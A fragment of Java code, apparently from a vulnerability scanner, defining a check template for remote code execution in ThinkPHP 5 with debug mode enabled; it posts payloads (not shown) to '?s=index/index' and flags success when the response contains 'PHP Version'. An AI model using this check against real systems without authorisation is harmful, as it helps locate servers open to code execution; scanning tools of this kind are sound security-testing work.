...
public class TP5DebugRce implements PayloadTemplate {
        ...
        try {
            for (StringBuffer payload : payloadList) {
                ...
                if (result.contains("PHP Version")) {
                    return new ResultUtils(true, "ThinkPHP5 Debug开启RCE", "url: " + url + "?s=index/index; post: " + payload.toString());
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new ResultUtils(false, "ThinkPHP5 Debug开启RCE", "");
    }
